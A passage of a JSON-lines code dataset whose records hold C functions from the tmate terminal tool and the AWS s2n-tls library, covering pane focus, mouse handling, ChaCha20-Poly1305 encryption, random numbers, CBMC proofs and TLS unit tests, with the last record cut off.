{"docstring": "/* Check whether pane should be focused. */\n", "func_signal": "void\nserver_client_check_focus(struct window_pane *wp)", "code": "{\n\tstruct client\t*c;\n\tint\t\t push;\n\n\t/* Are focus events off? */\n\tif (!options_get_number(global_options, \"focus-events\"))\n\t\treturn;\n\n\t/* Do we need to push the focus state? */\n\tpush = wp->flags & PANE_FOCUSPUSH;\n\twp->flags &= ~PANE_FOCUSPUSH;\n\n\t/* If we don't care about focus, forget it. */\n\tif (!(wp->base.mode & MODE_FOCUSON))\n\t\treturn;\n\n\t/* If we're not the active pane in our window, we're not focused. */\n\tif (wp->window->active != wp)\n\t\tgoto not_focused;\n\n\t/* If we're in a mode, we're not focused. */\n\tif (wp->screen != &wp->base)\n\t\tgoto not_focused;\n\n\t/*\n\t * If our window is the current window in any focused clients with an\n\t * attached session, we're focused.\n\t */\n\tTAILQ_FOREACH(c, &clients, entry) {\n\t\tif (c->session == NULL || !(c->flags & CLIENT_FOCUSED))\n\t\t\tcontinue;\n\t\tif (c->session->flags & SESSION_UNATTACHED)\n\t\t\tcontinue;\n\n\t\tif (c->session->curw->window == wp->window)\n\t\t\tgoto focused;\n\t}\n\nnot_focused:\n\tif (push || (wp->flags & PANE_FOCUSED))\n\t\tbufferevent_write(wp->event, \"\\033[O\", 3);\n\twp->flags &= ~PANE_FOCUSED;\n\treturn;\n\nfocused:\n\tif (push || !(wp->flags & PANE_FOCUSED))\n\t\tbufferevent_write(wp->event, \"\\033[I\", 3);\n\twp->flags |= PANE_FOCUSED;\n}", "path": "tmate/server-client.c", "commit_date": "2016-03-27 00:00:00", "repo_name": "tmate-io/tmate", "stars": 5461, "license": "other", "language": "c", "size": 16321}
{"docstring": "/* Check for mouse keys. */\n", "func_signal": "key_code\nserver_client_check_mouse(struct client *c)", "code": "{\n\tstruct session\t\t\t\t*s = c->session;\n\tstruct mouse_event\t\t\t*m = &c->tty.mouse;\n\tstruct window\t\t\t\t*w;\n\tstruct window_pane\t\t\t*wp;\n\tenum { NOTYPE, DOWN, UP, DRAG, WHEEL }\t type = NOTYPE;\n\tenum { NOWHERE, PANE, STATUS, BORDER }\t where = NOWHERE;\n\tu_int\t\t\t\t\t x, y, b;\n\tkey_code\t\t\t\t key;\n\n\tlog_debug(\"mouse %02x at %u,%u (last %u,%u) (%d)\", m->b, m->x, m->y,\n\t    m->lx, m->ly, c->tty.mouse_drag_flag);\n\n\t/* What type of event is this? */\n\tif (MOUSE_DRAG(m->b)) {\n\t\ttype = DRAG;\n\t\tif (c->tty.mouse_drag_flag) {\n\t\t\tx = m->x, y = m->y, b = m->b;\n\t\t\tlog_debug(\"drag update at %u,%u\", x, y);\n\t\t} else {\n\t\t\tx = m->lx, y = m->ly, b = m->lb;\n\t\t\tlog_debug(\"drag start at %u,%u\", x, y);\n\t\t}\n\t} else if (MOUSE_WHEEL(m->b)) {\n\t\ttype = WHEEL;\n\t\tx = m->x, y = m->y, b = m->b;\n\t\tlog_debug(\"wheel at %u,%u\", x, y);\n\t} else if (MOUSE_BUTTONS(m->b) == 3) {\n\t\ttype = UP;\n\t\tx = m->x, y = m->y, b = m->lb;\n\t\tlog_debug(\"up at %u,%u\", x, y);\n\t} else {\n\t\ttype = DOWN;\n\t\tx = m->x, y = m->y, b = m->b;\n\t\tlog_debug(\"down at %u,%u\", x, y);\n\t}\n\tif (type == NOTYPE)\n\t\treturn (KEYC_UNKNOWN);\n\n\t/* Always save the session. */\n\tm->s = s->id;\n\n\t/* Is this on the status line? */\n\tm->statusat = status_at_line(c);\n\tif (m->statusat != -1 && y == (u_int)m->statusat) {\n\t\tw = status_get_window_at(c, x);\n\t\tif (w == NULL)\n\t\t\treturn (KEYC_UNKNOWN);\n\t\tm->w = w->id;\n\t\twhere = STATUS;\n\t} else\n\t\tm->w = -1;\n\n\t/* Not on status line. Adjust position and check for border or pane. */\n\tif (where == NOWHERE) {\n\t\tif (m->statusat == 0 && y > 0)\n\t\t\ty--;\n\t\telse if (m->statusat > 0 && y >= (u_int)m->statusat)\n\t\t\ty = m->statusat - 1;\n\n\t\tTAILQ_FOREACH(wp, &s->curw->window->panes, entry) {\n\t\t\tif ((wp->xoff + wp->sx == x &&\n\t\t\t    wp->yoff <= 1 + y &&\n\t\t\t    wp->yoff + wp->sy >= y) ||\n\t\t\t    (wp->yoff + wp->sy == y &&\n\t\t\t    wp->xoff <= 1 + x &&\n\t\t\t    wp->xoff + wp->sx >= x))\n\t\t\t\tbreak;\n\t\t}\n\t\tif (wp != NULL)\n\t\t\twhere = BORDER;\n\t\telse {\n\t\t\twp = window_get_active_at(s->curw->window, x, y);\n\t\t\tif (wp != NULL) {\n\t\t\t\twhere = PANE;\n\t\t\t\tlog_debug(\"mouse at %u,%u is on pane %%%u\",\n\t\t\t\t    x, y, wp->id);\n\t\t\t}\n\t\t}\n\t\tif (where == NOWHERE)\n\t\t\treturn (KEYC_UNKNOWN);\n\t\tm->wp = wp->id;\n\t\tm->w = wp->window->id;\n\t} else\n\t\tm->wp = -1;\n\n\t/* Stop dragging if needed. */\n\tif (type != DRAG && c->tty.mouse_drag_flag) {\n\t\tif (c->tty.mouse_drag_release != NULL)\n\t\t\tc->tty.mouse_drag_release(c, m);\n\n\t\tc->tty.mouse_drag_update = NULL;\n\t\tc->tty.mouse_drag_release = NULL;\n\n\t\t/*\n\t\t * End a mouse drag by passing a MouseDragEnd key corresponding\n\t\t * to the button that started the drag.\n\t\t */\n\t\tswitch (c->tty.mouse_drag_flag) {\n\t\tcase 1:\n\t\t\tif (where == PANE)\n\t\t\t\tkey = KEYC_MOUSEDRAGEND1_PANE;\n\t\t\tif (where == STATUS)\n\t\t\t\tkey = KEYC_MOUSEDRAGEND1_STATUS;\n\t\t\tif (where == BORDER)\n\t\t\t\tkey = KEYC_MOUSEDRAGEND1_BORDER;\n\t\t\tbreak;\n\t\tcase 2:\n\t\t\tif (where == PANE)\n\t\t\t\tkey = KEYC_MOUSEDRAGEND2_PANE;\n\t\t\tif (where == STATUS)\n\t\t\t\tkey = KEYC_MOUSEDRAGEND2_STATUS;\n\t\t\tif (where == BORDER)\n\t\t\t\tkey = KEYC_MOUSEDRAGEND2_BORDER;\n\t\t\tbreak;\n\t\tcase 3:\n\t\t\tif (where == PANE)\n\t\t\t\tkey = KEYC_MOUSEDRAGEND3_PANE;\n\t\t\tif (where == STATUS)\n\t\t\t\tkey = KEYC_MOUSEDRAGEND3_STATUS;\n\t\t\tif (where == BORDER)\n\t\t\t\tkey = KEYC_MOUSEDRAGEND3_BORDER;\n\t\t\tbreak;\n\t\tdefault:\n\t\t\tkey = KEYC_MOUSE;\n\t\t\tbreak;\n\t\t}\n\t\tc->tty.mouse_drag_flag = 0;\n\n\t\treturn (key);\n\t}\n\n\t/* Convert to a key binding. */\n\tkey = KEYC_UNKNOWN;\n\tswitch (type) {\n\tcase NOTYPE:\n\t\tbreak;\n\tcase DRAG:\n\t\tif (c->tty.mouse_drag_update != NULL)\n\t\t\tc->tty.mouse_drag_update(c, m);\n\t\telse {\n\t\t\tswitch (MOUSE_BUTTONS(b)) {\n\t\t\tcase 0:\n\t\t\t\tif (where == PANE)\n\t\t\t\t\tkey = KEYC_MOUSEDRAG1_PANE;\n\t\t\t\tif (where == STATUS)\n\t\t\t\t\tkey = KEYC_MOUSEDRAG1_STATUS;\n\t\t\t\tif (where == BORDER)\n\t\t\t\t\tkey = KEYC_MOUSEDRAG1_BORDER;\n\t\t\t\tbreak;\n\t\t\tcase 1:\n\t\t\t\tif (where == PANE)\n\t\t\t\t\tkey = KEYC_MOUSEDRAG2_PANE;\n\t\t\t\tif (where == STATUS)\n\t\t\t\t\tkey = KEYC_MOUSEDRAG2_STATUS;\n\t\t\t\tif (where == BORDER)\n\t\t\t\t\tkey = KEYC_MOUSEDRAG2_BORDER;\n\t\t\t\tbreak;\n\t\t\tcase 2:\n\t\t\t\tif (where == PANE)\n\t\t\t\t\tkey = KEYC_MOUSEDRAG3_PANE;\n\t\t\t\tif (where == STATUS)\n\t\t\t\t\tkey = KEYC_MOUSEDRAG3_STATUS;\n\t\t\t\tif (where == BORDER)\n\t\t\t\t\tkey = KEYC_MOUSEDRAG3_BORDER;\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\n\t\t/*\n\t\t * Begin a drag by setting the flag to a non-zero value that\n\t\t * corresponds to the mouse button in use.\n\t\t */\n\t\tc->tty.mouse_drag_flag = MOUSE_BUTTONS(b) + 1;\n\t\tbreak;\n\tcase WHEEL:\n\t\tif (MOUSE_BUTTONS(b) == MOUSE_WHEEL_UP) {\n\t\t\tif (where == PANE)\n\t\t\t\tkey = KEYC_WHEELUP_PANE;\n\t\t\tif (where == STATUS)\n\t\t\t\tkey = KEYC_WHEELUP_STATUS;\n\t\t\tif (where == BORDER)\n\t\t\t\tkey = KEYC_WHEELUP_BORDER;\n\t\t} else {\n\t\t\tif (where == PANE)\n\t\t\t\tkey = KEYC_WHEELDOWN_PANE;\n\t\t\tif (where == STATUS)\n\t\t\t\tkey = KEYC_WHEELDOWN_STATUS;\n\t\t\tif (where == BORDER)\n\t\t\t\tkey = KEYC_WHEELDOWN_BORDER;\n\t\t}\n\t\tbreak;\n\tcase UP:\n\t\tswitch (MOUSE_BUTTONS(b)) {\n\t\tcase 0:\n\t\t\tif (where == PANE)\n\t\t\t\tkey = KEYC_MOUSEUP1_PANE;\n\t\t\tif (where == STATUS)\n\t\t\t\tkey = KEYC_MOUSEUP1_STATUS;\n\t\t\tif (where == BORDER)\n\t\t\t\tkey = KEYC_MOUSEUP1_BORDER;\n\t\t\tbreak;\n\t\tcase 1:\n\t\t\tif (where == PANE)\n\t\t\t\tkey = KEYC_MOUSEUP2_PANE;\n\t\t\tif (where == STATUS)\n\t\t\t\tkey = KEYC_MOUSEUP2_STATUS;\n\t\t\tif (where == BORDER)\n\t\t\t\tkey = KEYC_MOUSEUP2_BORDER;\n\t\t\tbreak;\n\t\tcase 2:\n\t\t\tif (where == PANE)\n\t\t\t\tkey = KEYC_MOUSEUP3_PANE;\n\t\t\tif (where == STATUS)\n\t\t\t\tkey = KEYC_MOUSEUP3_STATUS;\n\t\t\tif (where == BORDER)\n\t\t\t\tkey = KEYC_MOUSEUP3_BORDER;\n\t\t\tbreak;\n\t\t}\n\t\tbreak;\n\tcase DOWN:\n\t\tswitch (MOUSE_BUTTONS(b)) {\n\t\tcase 0:\n\t\t\tif (where == PANE)\n\t\t\t\tkey = KEYC_MOUSEDOWN1_PANE;\n\t\t\tif (where == STATUS)\n\t\t\t\tkey = KEYC_MOUSEDOWN1_STATUS;\n\t\t\tif (where == BORDER)\n\t\t\t\tkey = KEYC_MOUSEDOWN1_BORDER;\n\t\t\tbreak;\n\t\tcase 1:\n\t\t\tif (where == PANE)\n\t\t\t\tkey = KEYC_MOUSEDOWN2_PANE;\n\t\t\tif (where == STATUS)\n\t\t\t\tkey = KEYC_MOUSEDOWN2_STATUS;\n\t\t\tif (where == BORDER)\n\t\t\t\tkey = KEYC_MOUSEDOWN2_BORDER;\n\t\t\tbreak;\n\t\tcase 2:\n\t\t\tif (where == PANE)\n\t\t\t\tkey = KEYC_MOUSEDOWN3_PANE;\n\t\t\tif (where == STATUS)\n\t\t\t\tkey = KEYC_MOUSEDOWN3_STATUS;\n\t\t\tif (where == BORDER)\n\t\t\t\tkey = KEYC_MOUSEDOWN3_BORDER;\n\t\t\tbreak;\n\t\t}\n\t\tbreak;\n\t}\n\tif (key == KEYC_UNKNOWN)\n\t\treturn (KEYC_UNKNOWN);\n\n\t/* Apply modifiers if any. */\n\tif (b & MOUSE_MASK_META)\n\t\tkey |= KEYC_ESCAPE;\n\tif (b & MOUSE_MASK_CTRL)\n\t\tkey |= KEYC_CTRL;\n\tif (b & MOUSE_MASK_SHIFT)\n\t\tkey |= KEYC_SHIFT;\n\n\treturn (key);\n}", "path": "tmate/server-client.c", "commit_date": "2016-03-27 00:00:00", "repo_name": "tmate-io/tmate", "stars": 5461, "license": "other", "language": "c", "size": 16321}
{"docstring": "/* OpenSSL implementation */\n", "func_signal": "static int s2n_aead_chacha20_poly1305_encrypt(struct s2n_session_key *key, struct s2n_blob *iv, struct s2n_blob *aad, struct s2n_blob *in, struct s2n_blob *out)", "code": "{\n    gte_check(in->size, S2N_TLS_CHACHA20_POLY1305_TAG_LEN);\n    /* The size of the |in| blob includes the size of the data and the size of the ChaCha20-Poly1305 tag */\n    gte_check(out->size, in->size);\n    eq_check(iv->size, S2N_TLS_CHACHA20_POLY1305_IV_LEN);\n\n    /* Initialize the IV */\n    GUARD_OSSL(EVP_EncryptInit_ex(key->evp_cipher_ctx, NULL, NULL, NULL, iv->data), S2N_ERR_KEY_INIT);\n\n    /* Adjust input length and buffer pointer to account for the Tag length */\n    int in_len = in->size - S2N_TLS_CHACHA20_POLY1305_TAG_LEN;\n    uint8_t *tag_data = out->data + out->size - S2N_TLS_CHACHA20_POLY1305_TAG_LEN;\n\n    int out_len;\n    /* Specify the AAD */\n    GUARD_OSSL(EVP_EncryptUpdate(key->evp_cipher_ctx, NULL, &out_len, aad->data, aad->size), S2N_ERR_ENCRYPT);\n\n    /* Encrypt the data */\n    GUARD_OSSL(EVP_EncryptUpdate(key->evp_cipher_ctx, out->data, &out_len, in->data, in_len), S2N_ERR_ENCRYPT);\n\n    /* For OpenSSL 1.1.0 and 1.1.1, when using ChaCha20-Poly1305, *out_len is the number of bytes written by EVP_EncryptUpdate. Since the tag is not written during this call, we do not take S2N_TLS_CHACHA20_POLY1305_TAG_LEN into account */\n    S2N_ERROR_IF(in_len != out_len, S2N_ERR_ENCRYPT);\n\n    /* Finalize */\n    GUARD_OSSL(EVP_EncryptFinal_ex(key->evp_cipher_ctx, out->data, &out_len), S2N_ERR_ENCRYPT);\n\n    /* Write the tag */\n    GUARD_OSSL(EVP_CIPHER_CTX_ctrl(key->evp_cipher_ctx, EVP_CTRL_AEAD_GET_TAG, S2N_TLS_CHACHA20_POLY1305_TAG_LEN, tag_data), S2N_ERR_ENCRYPT);\n\n    /* For OpenSSL 1.1.0 and 1.1.1, when using ChaCha20-Poly1305, EVP_EncryptFinal_ex does not write any bytes. So, we should expect *out_len = 0. */\n    S2N_ERROR_IF(0 != out_len, S2N_ERR_ENCRYPT);\n\n    return 0;\n}", "path": "s2n-tls/crypto/s2n_aead_cipher_chacha20_poly1305.c", "commit_date": "2020-09-29 00:00:00", "repo_name": "aws/s2n-tls", "stars": 4433, "license": "apache-2.0", "language": "c", "size": 27735}
{"docstring": "/* BoringSSL and AWS-LC implementation */\n", "func_signal": "static int s2n_aead_chacha20_poly1305_encrypt(struct s2n_session_key *key, struct s2n_blob *iv, struct s2n_blob *aad, struct s2n_blob *in, struct s2n_blob *out)", "code": "{\n    gte_check(in->size, S2N_TLS_CHACHA20_POLY1305_TAG_LEN);\n    /* The size of the |in| blob includes the size of the data and the size of the ChaCha20-Poly1305 tag */\n    gte_check(out->size, in->size);\n    eq_check(iv->size, S2N_TLS_CHACHA20_POLY1305_IV_LEN);\n\n    /* Adjust input length to account for the Tag length */\n    size_t in_len = in->size - S2N_TLS_CHACHA20_POLY1305_TAG_LEN;\n    size_t out_len = 0;\n\n    GUARD_OSSL(EVP_AEAD_CTX_seal(key->evp_aead_ctx, out->data, &out_len, out->size, iv->data, iv->size, in->data, in_len, aad->data, aad->size), S2N_ERR_ENCRYPT);\n\n    S2N_ERROR_IF((in_len + S2N_TLS_CHACHA20_POLY1305_TAG_LEN) != out_len, S2N_ERR_ENCRYPT);\n\n    return 0;\n}", "path": "s2n-tls/crypto/s2n_aead_cipher_chacha20_poly1305.c", "commit_date": "2020-09-29 00:00:00", "repo_name": "aws/s2n-tls", "stars": 4433, "license": "apache-2.0", "language": "c", "size": 27735}
{"docstring": "/*\n * This must only be used for unit tests. Any real use is dangerous and will be overwritten in s2n_defend_if_forked if\n * it is forked. This was added to support known answer tests that use OpenSSL and s2n_get_private_random_data directly.\n */\n", "func_signal": "S2N_RESULT s2n_set_private_drbg_for_test(struct s2n_drbg drbg)", "code": "{\n    ENSURE(s2n_in_unit_test(), S2N_ERR_NOT_IN_UNIT_TEST);\n    GUARD_AS_RESULT(s2n_drbg_wipe(&per_thread_private_drbg));\n\n    per_thread_private_drbg = drbg;\n    return S2N_RESULT_OK;\n}", "path": "s2n-tls/utils/s2n_random.c", "commit_date": "2020-11-06 00:00:00", "repo_name": "aws/s2n-tls", "stars": 4433, "license": "apache-2.0", "language": "c", "size": 27735}
{"docstring": "/**\n * This test ensures that we don't allow releasing connection buffers if they contain part\n * of the unprocessed record, avoiding conneciton corruption.\n */\n", "func_signal": "int main(int argc, char **argv)", "code": "{\n    struct s2n_connection *conn;\n    struct s2n_config *config;\n    s2n_blocked_status blocked;\n    int status;\n    pid_t pid;\n    char *cert_chain_pem;\n    char *private_key_pem;\n    struct s2n_cert_chain_and_key *chain_and_key;\n    struct s2n_stuffer in, out;\n    uint8_t buf[sizeof(buf_to_send)];\n    uint32_t n = 0;\n    ssize_t ret = 0;\n\n    BEGIN_TEST();\n    EXPECT_SUCCESS(s2n_disable_tls13());\n\n    EXPECT_NOT_NULL(config = s2n_config_new());\n    EXPECT_NOT_NULL(cert_chain_pem = malloc(S2N_MAX_TEST_PEM_SIZE));\n    EXPECT_NOT_NULL(private_key_pem = malloc(S2N_MAX_TEST_PEM_SIZE));\n    EXPECT_SUCCESS(s2n_read_test_pem(S2N_DEFAULT_TEST_CERT_CHAIN, cert_chain_pem, S2N_MAX_TEST_PEM_SIZE));\n    EXPECT_SUCCESS(s2n_read_test_pem(S2N_DEFAULT_TEST_PRIVATE_KEY, private_key_pem, S2N_MAX_TEST_PEM_SIZE));\n    EXPECT_NOT_NULL(chain_and_key = s2n_cert_chain_and_key_new());\n    EXPECT_SUCCESS(s2n_cert_chain_and_key_load_pem(chain_and_key, cert_chain_pem, private_key_pem));\n    EXPECT_SUCCESS(s2n_config_add_cert_chain_and_key_to_store(config, chain_and_key));\n\n    /* Create a pipe */\n    struct s2n_test_io_pair io_pair;\n    EXPECT_SUCCESS(s2n_io_pair_init(&io_pair));\n\n    /* Create a child process */\n    pid = fork();\n    if (pid == 0) {\n        /* This is the client process, close the server end of the pipe */\n        EXPECT_SUCCESS(s2n_io_pair_close_one_end(&io_pair, S2N_SERVER));\n\n        /* Free the config */\n        EXPECT_SUCCESS(s2n_config_free(config));\n        free(cert_chain_pem);\n        free(private_key_pem);\n\n        /* Run the client */\n        mock_client(&io_pair);\n    }\n\n    /* This is the server process, close the client end of the pipe */\n    EXPECT_SUCCESS(s2n_io_pair_close_one_end(&io_pair, S2N_CLIENT));\n\n    EXPECT_NOT_NULL(conn = s2n_connection_new(S2N_SERVER));\n    EXPECT_SUCCESS(s2n_connection_set_config(conn, config));\n\n    /* Make pipes non-blocking */\n    EXPECT_SUCCESS(s2n_fd_set_non_blocking(io_pair.server));\n    EXPECT_SUCCESS(s2n_fd_set_non_blocking(io_pair.server));\n\n    /* Set up our I/O callbacks. Use stuffers for the \"I/O context\" */\n    EXPECT_SUCCESS(s2n_stuffer_growable_alloc(&in, 0));\n    EXPECT_SUCCESS(s2n_stuffer_growable_alloc(&out, 0));\n    EXPECT_SUCCESS(s2n_connection_set_io_stuffers(&in, &out, conn));\n\n    /* Negotiate the handshake. */\n    do {\n        ret = s2n_negotiate(conn, &blocked);\n        EXPECT_TRUE(ret == 0 || (blocked && (errno == EAGAIN || errno == EWOULDBLOCK)));\n\n        /* check to see if we need to copy more over from the pipes to the buffers\n         * to continue the handshake */\n        s2n_stuffer_recv_from_fd(&in, io_pair.server, MAX_BUF_SIZE, NULL);\n        s2n_stuffer_send_to_fd(&out, io_pair.server, s2n_stuffer_data_available(&out), NULL);\n    } while (blocked);\n\n    /* Receive only 100 bytes of the record and try to call s2n_recv */\n    while (n < 100) {\n        ret = s2n_stuffer_recv_from_fd(&in, io_pair.server, 100 - n, &n);\n\n        if (errno == EAGAIN || errno == EWOULDBLOCK) {\n            continue;\n        } else {\n            GUARD(ret);\n        }\n    }\n\n    /* s2n_recv should fail as we received only part of the record */\n    EXPECT_FAILURE(s2n_recv(conn, buf, sizeof(buf), &blocked));\n    EXPECT_TRUE(blocked == S2N_BLOCKED_ON_READ);\n\n    /* Now try to release the buffers and expect failure as buffers are not empty */\n    EXPECT_FAILURE(s2n_connection_release_buffers(conn));\n\n    /* Read the rest of the buffer and expect s2n_recv to succeed */\n    do {\n        ret = s2n_stuffer_recv_from_fd(&in, io_pair.server, MAX_BUF_SIZE, NULL);\n\n        if (errno == EAGAIN || errno == EWOULDBLOCK) {\n            continue;\n        } else {\n            GUARD(ret);\n        }\n\n        ret = s2n_recv(conn, buf, sizeof(buf), &blocked);\n    } while (ret < 0 && s2n_error_get_type(s2n_errno) == S2N_ERR_T_BLOCKED\n                 && blocked == S2N_BLOCKED_ON_READ);\n\n    /* Expect that we read the data client sent us */\n    EXPECT_TRUE(ret == sizeof(buf_to_send));\n    EXPECT_TRUE(memcmp(buf, buf_to_send, ret) == 0);\n\n    /* Since full record was processed, we should be able to release buffers */\n    EXPECT_SUCCESS(s2n_connection_release_buffers(conn));\n\n    /* Shutdown after negotiating */\n    uint8_t server_shutdown=0;\n    do {\n        ret = s2n_shutdown(conn, &blocked);\n        EXPECT_TRUE(ret == 0 || (blocked && (errno == EAGAIN || errno == EWOULDBLOCK)));\n        if (ret == 0) {\n            server_shutdown = 1;\n        }\n\n        s2n_stuffer_recv_from_fd(&in, io_pair.server, MAX_BUF_SIZE, NULL);\n        s2n_stuffer_send_to_fd(&out, io_pair.server, s2n_stuffer_data_available(&out), NULL);\n    } while (!server_shutdown);\n\n    EXPECT_SUCCESS(s2n_connection_free(conn));\n\n    /* Clean up */\n    EXPECT_SUCCESS(s2n_stuffer_free(&in));\n    EXPECT_SUCCESS(s2n_stuffer_free(&out));\n    EXPECT_EQUAL(waitpid(-1, &status, 0), pid);\n    EXPECT_EQUAL(status, 0);\n    EXPECT_SUCCESS(s2n_config_free(config));\n    EXPECT_SUCCESS(s2n_cert_chain_and_key_free(chain_and_key));\n    free(cert_chain_pem);\n    free(private_key_pem);\n\n    s2n_cleanup();\n\n    END_TEST();\n\n    return 0;\n}", "path": "s2n-tls/tests/unit/s2n_release_non_empty_buffers_test.c", "commit_date": "2020-12-16 00:00:00", "repo_name": "aws/s2n-tls", "stars": 4433, "license": "apache-2.0", "language": "c", "size": 27735}
{"docstring": "/**\n * Add assumptions that equality is reflexive and symmetric. Don't bother with\n * transitivity because it doesn't cause any spurious proof failures on hash-table\n */\n", "func_signal": "bool uninterpreted_equals(const void *const a, const void *const b)", "code": "{\n    bool rval = __CPROVER_uninterpreted_equals(a, b);\n    /* Equals is reflexive */\n    __CPROVER_assume(IMPLIES(a == b, rval));\n    /* Equals is symmetric */\n    __CPROVER_assume(__CPROVER_uninterpreted_equals(b, a) == rval);\n    /* If two things are equal, their hashes are also equal */\n    if (rval) { __CPROVER_assume(__CPROVER_uninterpreted_hasher(a) == __CPROVER_uninterpreted_hasher(b)); }\n    return rval;\n}", "path": "s2n-tls/tests/cbmc/sources/cbmc_utils.c", "commit_date": "2020-12-03 00:00:00", "repo_name": "aws/s2n-tls", "stars": 4433, "license": "apache-2.0", "language": "c", "size": 27735}
{"docstring": "/**\n * Standard stub function to hash one item.\n */\n", "func_signal": "uint64_t uninterpreted_hasher(const void *a)", "code": "{\n    assert(a != NULL);\n    return __CPROVER_uninterpreted_hasher(a);\n}", "path": "s2n-tls/tests/cbmc/sources/cbmc_utils.c", "commit_date": "2020-12-03 00:00:00", "repo_name": "aws/s2n-tls", "stars": 4433, "license": "apache-2.0", "language": "c", "size": 27735}
{"docstring": "/*\n * Return a random number in the range [0, bound)\n */\n", "func_signal": "S2N_RESULT s2n_public_random(int64_t bound, uint64_t *output)", "code": "{\n    uint64_t r;\n\n    ENSURE_GT(bound, 0);\n\n    while (1) {\n        struct s2n_blob blob = {.data = (void *)&r, sizeof(r) };\n        GUARD_RESULT(s2n_get_public_random_data(&blob));\n\n        /* Imagine an int was one byte and UINT_MAX was 256. If the\n         * caller asked for s2n_random(129, ...) we'd end up in\n         * trouble. Each number in the range 0...127 would be twice\n         * as likely as 128. That's because r == 0 % 129 -> 0, and\n         * r == 129 % 129 -> 0, but only r == 128 returns 128,\n         * r == 257 is out of range.\n         *\n         * To de-bias the dice, we discard values of r that are higher\n         * that the highest multiple of 'bound' an int can support. If\n         * bound is a uint, then in the worst case we discard 50% - 1 r's.\n         * But since 'bound' is an int and INT_MAX is <= UINT_MAX / 2,\n         * in the worst case we discard 25% - 1 r's.\n         */\n        if (r < (UINT64_MAX - (UINT64_MAX % bound))) {\n            *output = r % bound;\n            return S2N_RESULT_OK;\n        }\n    }\n}", "path": "s2n-tls/utils/s2n_random.c", "commit_date": "2020-11-06 00:00:00", "repo_name": "aws/s2n-tls", "stars": 4433, "license": "apache-2.0", "language": "c", "size": 27735}
{"docstring": "/* Preserve the handlers for hmac state pointers to avoid re-allocation\n * Only valid if the HMAC is in EVP mode\n */\n", "func_signal": "int s2n_hmac_save_evp_hash_state(struct s2n_hmac_evp_backup* backup, struct s2n_hmac_state* hmac)", "code": "{\n    backup->inner = hmac->inner.digest.high_level;\n    backup->inner_just_key = hmac->inner_just_key.digest.high_level;\n    backup->outer = hmac->outer.digest.high_level;\n    backup->outer_just_key = hmac->outer_just_key.digest.high_level;\n    return 0;\n}", "path": "s2n-tls/crypto/s2n_hmac.c", "commit_date": "2020-12-15 00:00:00", "repo_name": "aws/s2n-tls", "stars": 4433, "license": "apache-2.0", "language": "c", "size": 27735}
{"docstring": "/* From https://tools.ietf.org/html/rfc8446#section-4.1.2\n * If a \"key_share\" extension was supplied in the HelloRetryRequest,\n * replace the list of shares with a list containing a single\n * KeyShareEntry from the indicated group.*/\n", "func_signal": "static int s2n_send_hrr_keyshare(struct s2n_connection *conn, struct s2n_stuffer *out)", "code": "{\n    notnull_check(conn);\n    notnull_check(out);\n\n    if (conn->secure.server_kem_group_params.kem_group != NULL) {\n        GUARD(s2n_send_hrr_pq_hybrid_keyshare(conn, out));\n    } else {\n        GUARD(s2n_send_hrr_ecc_keyshare(conn, out));\n    }\n\n    return S2N_SUCCESS;\n}", "path": "s2n-tls/tls/extensions/s2n_client_key_share.c", "commit_date": "2020-10-19 00:00:00", "repo_name": "aws/s2n-tls", "stars": 4433, "license": "apache-2.0", "language": "c", "size": 27735}
{"docstring": "/* When using QUIC, S2N writes unencrypted handshake messages instead of encrypted records.\n * This method sets up the S2N output buffer to match the result of using s2n_record_write.\n */\n", "func_signal": "S2N_RESULT s2n_quic_write_handshake_message(struct s2n_connection *conn, struct s2n_blob *in)", "code": "{\n    ENSURE_REF(conn);\n\n    /* Allocate stuffer space now so that we don't have to realloc later in the handshake. */\n    GUARD_AS_RESULT(s2n_stuffer_resize_if_empty(&conn->out, S2N_EXPECTED_QUIC_MESSAGE_SIZE));\n\n    GUARD_AS_RESULT(s2n_stuffer_write(&conn->out, in));\n    return S2N_RESULT_OK;\n}", "path": "s2n-tls/tls/s2n_quic_support.c", "commit_date": "2020-11-11 00:00:00", "repo_name": "aws/s2n-tls", "stars": 4433, "license": "apache-2.0", "language": "c", "size": 27735}
{"docstring": "/*\n * Since this function largely serves as a way to call specific OpenSSL\n * functions (which we do not fully emulate in CBMC), all we can assert\n * is memory safety. As such, several OpenSSL functions have been stubbed,\n * and a few functions have been left omitted since they do not affect\n * the proof.\n */\n", "func_signal": "void s2n_pkcs3_to_dh_params_openssl_1_1_0_harness()", "code": "{\n    /* Non-deterministic inputs. */\n    struct s2n_dh_params *dh_params = cbmc_allocate_dh_params();\n    struct s2n_blob *     pkcs3     = cbmc_allocate_s2n_blob();\n\n    /* Assumptions. */\n    __CPROVER_assume(s2n_result_is_ok(s2n_blob_validate(pkcs3)));\n    __CPROVER_assume(s2n_blob_is_bounded(pkcs3, MAX_BLOB_SIZE));\n    nondet_s2n_mem_init();\n\n    /* Save previous state. */\n    uint8_t *                     old_data = pkcs3->data;\n    struct store_byte_from_buffer old_byte;\n    save_byte_from_blob(pkcs3, &old_byte);\n\n    /* Operation under verification. */\n    if (s2n_pkcs3_to_dh_params(dh_params, pkcs3) == S2N_SUCCESS) {\n        /* Postconditions. */\n        assert(pkcs3->data == old_data);\n        assert_byte_from_blob_matches(pkcs3, &old_byte);\n    }\n}", "path": "s2n-tls/tests/cbmc/proofs/s2n_pkcs3_to_dh_params_openssl_1_1_0/s2n_pkcs3_to_dh_params_openssl_1_1_0_harness.c", "commit_date": "2020-12-10 00:00:00", "repo_name": "aws/s2n-tls", "stars": 4433, "license": "apache-2.0", "language": "c", "size": 27735}
{"docstring": "/* These tests check the server's logic when selecting a keyshare and supporting group. */\n", "func_signal": "int main()", "code": "{\n    BEGIN_TEST();\n\n    EXPECT_SUCCESS(s2n_enable_tls13());\n\n    /* If client and server have no mutually supported groups, abort the handshake without sending HRR. */\n    {\n        struct s2n_connection *server_conn = NULL;\n        EXPECT_NOT_NULL(server_conn = s2n_connection_new(S2N_SERVER));\n        EXPECT_SUCCESS(s2n_connection_set_all_protocol_versions(server_conn, S2N_TLS13));\n\n        EXPECT_NULL(server_conn->secure.server_ecc_evp_params.negotiated_curve);\n        EXPECT_NULL(server_conn->secure.server_kem_group_params.kem_group);\n\n        EXPECT_FAILURE_WITH_ERRNO(s2n_extensions_server_key_share_select(server_conn),\n                S2N_ERR_ECDHE_UNSUPPORTED_CURVE);\n\n        EXPECT_NULL(server_conn->secure.server_ecc_evp_params.negotiated_curve);\n        EXPECT_NULL(server_conn->secure.server_kem_group_params.kem_group);\n        EXPECT_FALSE(s2n_is_hello_retry_handshake(server_conn));\n\n        